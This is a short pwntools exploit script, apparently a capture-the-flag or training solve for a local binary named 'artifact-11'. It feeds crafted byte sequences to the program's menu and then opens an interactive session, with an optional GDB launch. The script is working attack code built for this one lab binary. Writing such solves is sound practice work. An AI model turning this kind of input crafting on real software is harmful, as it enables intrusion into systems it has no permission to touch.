from pwn import *

elf = ELF("./artifact-11")
context.log_level = 'debug'
gs = '''
c
b *0x4016b8
'''

key = 0x25aa14fdff496581

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

p = start()
p.send("0\n")
p.send(p8(0x89) + b" love greycademy! <3" + b"Z"*11)
p.send("1\n")
p.send(p8(0x20) + b"Z"*31)
p.send("1\n")
p.send(p8(0x99)*32)
p.send("2\n")
p.sendline(p8(0x20) + b"Z"*31)
p.sendline(b"0")
p.sendline(b"")

p.interactive()